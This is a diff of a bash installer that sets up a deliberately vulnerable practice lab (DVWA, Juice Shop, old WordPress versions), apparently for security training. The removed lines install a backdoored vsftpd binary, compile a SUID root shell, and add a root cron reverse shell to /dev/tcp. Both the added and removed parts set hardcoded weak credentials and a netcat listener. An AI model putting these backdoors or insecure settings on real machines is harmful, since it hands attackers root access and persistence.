@@ -1,7 +1,7 @@
 
 #!/bin/bash
-# Vuln Lab Universal Installer by dword32bit
-# Supports re-run, reset, and repair. Ubuntu 20.04/22.04
+# Vuln Lab ULTIMATE Installer - by dword32bit
+# Playground lengkap untuk level pemula sampai pro
 
 set -e
 
@@ -32,8 +32,36 @@ check_and_install_node() {
   fi
 }
 
+install_wordpress() {
+  VERSION=$1
+  DEST="/var/www/html/wordpress-${VERSION}"
+  DBNAME="wp${VERSION//./}"
+  log_info "Installing WordPress $VERSION..."
+  rm -rf "$DEST"
+  mkdir -p "$DEST"
+  wget https://wordpress.org/wordpress-${VERSION}.tar.gz -O /tmp/wp${VERSION}.tar.gz
+  tar -xzf /tmp/wp${VERSION}.tar.gz -C /tmp/
+  mv /tmp/wordpress/* "$DEST"
+  mysql -uroot -p${MYSQL_ROOT_PW} -e "DROP DATABASE IF EXISTS ${DBNAME}; CREATE DATABASE ${DBNAME};"
+  cat <<EOF > "$DEST/wp-config.php"
+<?php
+define('DB_NAME', '${DBNAME}');
+define('DB_USER', 'dvwa');
+define('DB_PASSWORD', 'p@ssw0rd');
+define('DB_HOST', 'localhost');
+define('DB_CHARSET', 'utf8');
+define('DB_COLLATE', '');
+\$table_prefix = 'wp_';
+define('WP_DEBUG', false);
+if ( !defined('ABSPATH') )
+    define('ABSPATH', dirname(__FILE__) . '/');
+require_once(ABSPATH . 'wp-settings.php');
+EOF
+  chown -R www-data:www-data "$DEST"
+}
+
 log_info "Installing dependencies..."
-apt update && apt install -y apache2 php php-mysqli mariadb-server git unzip curl vsftpd openssh-server     nodejs npm netcat gcc g++ build-essential libcap2-bin
+apt update && apt install -y apache2 php php-mysqli mariadb-server git unzip curl vsftpd openssh-server     nodejs npm netcat gcc g++ build-essential libcap2-bin wget php-curl php-gd php-xml php-mbstring php-zip
 
 log_info "Starting MySQL..."
 systemctl start mysql || service mysql start
@@ -77,69 +105,40 @@ git clone https://github.com/bkimminich/juice-shop.git .
 npm install --legacy-peer-deps || true
 nohup npm start &
 
-log_info "Installing/Resetting vsftpd 2.3.4 (backdoored)..."
-wget https://github.com/andresriancho/vsftpd-2.3.4-backdoor/raw/master/vsftpd-2.3.4 -O /usr/sbin/vsftpd
-chmod +x /usr/sbin/vsftpd
-cat <<EOF > /etc/vsftpd.conf
-listen=YES
-anonymous_enable=YES
-local_enable=YES
-write_enable=YES
-xferlog_enable=YES
-connect_from_port_20=YES
+install_wordpress "4.7"
+install_wordpress "4.8"
+
+log_info "Installing Simple Blog..."
+rm -rf /var/www/html/simple-blog
+git clone https://github.com/l33t-haxor/simple-php-blog-vuln.git /var/www/html/simple-blog
+
+log_info "Creating index page for vulnerable apps..."
+cat <<EOF > /var/www/html/index.html
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Vuln Lab Entry</title>
+  <style>
+    body { font-family: monospace; padding: 30px; background: #111; color: #0f0; }
+    a { color: #00f; text-decoration: none; }
+    a:hover { text-decoration: underline; }
+  </style>
+</head>
+<body>
+  <h2>Vuln Lab Targets</h2>
+  <ol>
+    <li><a href="/mutillidae" target="_blank">Mutillidae</a></li>
+    <li><a href="/dvwa" target="_blank">DVWA</a></li>
+    <li><a href="/bwapp" target="_blank">bWAPP</a></li>
+    <li><a href="http://localhost:3000" target="_blank">Juice Shop</a></li>
+    <li><a href="/wordpress-4.7" target="_blank">WordPress 4.7</a></li>
+    <li><a href="/wordpress-4.8" target="_blank">WordPress 4.8</a></li>
+    <li><a href="/simple-blog" target="_blank">Simple Blog</a></li>
+  </ol>
+  <hr>
+  <p>Reverse shell listener: <code>nc -lvnp 4444</code></p>
+</body>
+</html>
 EOF
-useradd -M -s /bin/false ftpuser || true
-echo "ftpuser:12345" | chpasswd
-/usr/sbin/vsftpd &
 
-log_info "Resetting SSH user..."
-userdel -r hacker 2>/dev/null || true
-useradd hacker -m -s /bin/bash
-echo "hacker:hackme" | chpasswd
-
-log_info "Creating SUID root shell..."
-echo -e '#include <stdlib.h>\n#include <unistd.h>\nint main(){setuid(0); system("/bin/bash"); return 0;}' > /tmp/rootshell.c
-gcc /tmp/rootshell.c -o /usr/local/bin/rootshell
-chmod 4755 /usr/local/bin/rootshell
-rm /tmp/rootshell.c
-
-log_info "Setting cron reverse shell..."
-sed -i '/\/dev\/tcp\/127.0.0.1\/4444/d' /etc/crontab
-echo "* * * * * root bash -i >& /dev/tcp/127.0.0.1/4444 0>&1" >> /etc/crontab
-
-log_info "Creating flags and logger..."
-mkdir -p /opt/flags /var/tmp/.hidden /opt/scripts
-
-echo "FLAG{dvwa_root_pwned}" > /opt/flags/flag1.txt
-echo "FLAG{ftp_backdoor_triggered}" > /var/tmp/.hidden/ftp_flag.txt
-echo "FLAG{juice_shop_xss}" | base64 > /opt/flags/juice_flag.b64
-echo "FLAG{mysql_dump_success}" > /root/mysql_flag.txt
-echo "FLAG{reverse_shell_callback}" > /opt/flags/rev_flag.txt
-
-chmod 600 /opt/flags/*.txt /root/mysql_flag.txt
-chmod 640 /var/tmp/.hidden/ftp_flag.txt
-chown ftpuser:ftpuser /var/tmp/.hidden/ftp_flag.txt
-
-cat <<EOF > /opt/scripts/log_score.sh
-#!/bin/bash
-echo "\$(date) - FLAG found: \$1 by user: \$(whoami)" >> /var/log/scoreboard.log
-EOF
-chmod +x /opt/scripts/log_score.sh
-
-log_info "Starting reverse shell listener..."
-pkill -f "nc -lvnp 4444" || true
-nohup nc -lvnp 4444 > /opt/reverse_shell.log 2>&1 &
-
-log_info "Restarting Apache and MySQL..."
-systemctl restart apache2 mysql
-
-echo ""
-echo "✅ Vuln Lab is ready. Access:"
-echo "  DVWA        → http://<IP>/dvwa"
-echo "  bWAPP       → http://<IP>/bwapp"
-echo "  Mutillidae  → http://<IP>/mutillidae"
-echo "  Juice Shop  → http://<IP>:3000"
-echo "  SUID Shell  → /usr/local/bin/rootshell"
-echo "  RevShell    → nc -lvnp 4444 (localhost)"
-echo ""
-echo "💡 Re-run this script anytime to reset everything."
+log_info "Script complete. Web UI and all vuln services are ready!"
